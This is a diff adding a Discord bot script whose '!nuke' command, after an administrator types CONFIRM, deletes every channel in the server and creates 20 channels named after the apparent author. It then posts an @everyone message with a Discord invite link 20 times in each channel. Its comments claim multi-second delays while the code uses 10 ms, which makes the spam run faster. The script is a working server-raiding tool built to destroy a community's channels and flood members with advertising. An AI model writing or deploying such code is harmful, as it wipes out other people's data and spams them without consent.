@@ -1,0 +1,99 @@
+const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
+
+// Replace with your bot token
+const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+
+const client = new Client({
+    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
+});
+
+client.once('ready', () => {
+    console.log(`Logged in as ${client.user.tag}!`);
+});
+
+client.on('messageCreate', async (message) => {
+    // Check if the message is "!nuke" and not from a bot
+    if (message.content === '!nuke' && !message.author.bot) {
+        const member = message.member;
+
+        // Check if the user has Administrator permission
+        if (!member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+            return message.reply('You need Administrator permission to use this command.');
+        }
+
+        // Ask for confirmation
+        const confirmationMessage = await message.reply(
+            'Are you sure you want to nuke all channels and recreate new ones? Type `CONFIRM` to proceed within 30 seconds.'
+        );
+
+        // Collect confirmation
+        const filter = (response) =>
+            response.author.id === message.author.id && response.content === 'CONFIRM';
+
+        const collector = message.channel.createMessageCollector({ filter, time: 30000 });
+
+        collector.on('collect', async () => {
+            collector.stop(); // Stop collector after confirmation
+
+            // Notify the user
+            if (confirmationMessage) {
+                confirmationMessage
+                    .edit('Nuking all channels and creating new ones... This will take a moment.')
+                    .catch((err) => console.error('Failed to edit confirmation message:', err));
+            }
+
+            const guild = message.guild;
+            const channels = guild.channels.cache;
+
+            // Step 1: Delete all channels
+            let delay = 0;
+            for (const channel of channels.values()) {
+                setTimeout(() => {
+                    channel
+                        .delete()
+                        .catch((err) => console.error(`Failed to delete channel ${channel.name}:`, err));
+                }, delay);
+                delay += 10; // 3 seconds delay between deletions
+            }
+
+            // Step 2: Wait for all deletions to finish
+            setTimeout(async () => {
+                // Step 3: Create 20 new channels
+                for (let i = 1; i <= 20; i++) {
+                    setTimeout(async () => {
+                        try {
+                            const newChannel = await guild.channels.create({
+                                name: `nuke-by-jalaliset-${i}`,
+                                type: 0, // Text channel type
+                            });
+
+                            // Send the @everyone message 20 times in the new channel
+                            for (let j = 0; j < 20; j++) {
+                                setTimeout(() => {
+                                    newChannel
+                                        .send(`@everyone YOOOOOOOOOOOOOOOOOOOOOOOOOOO Join Now https://discord.gg/a7Q3yKmDSw`)
+                                        .catch((err) => console.error('Failed to send message:', err));
+                                }, j * 10); // 1 second delay between each message
+                            }
+                        } catch (err) {
+                            console.error(`Failed to create or message channel:`, err);
+                        }
+                    }, i * 10);
+                }
+            }, delay + 10); // Wait for all deletions to finish before creating channels
+        });
+
+        collector.on('end', (collected) => {
+            if (!collected.size) {
+                if (confirmationMessage) {
+                    confirmationMessage
+                        .edit('Nuke operation cancelled. No confirmation received.')
+                        .catch((err) => console.error('Failed to edit cancellation message:', err));
+                }
+            }
+        });
+    }
+});
+
+// Login to Discord
+client.login(BOT_TOKEN);
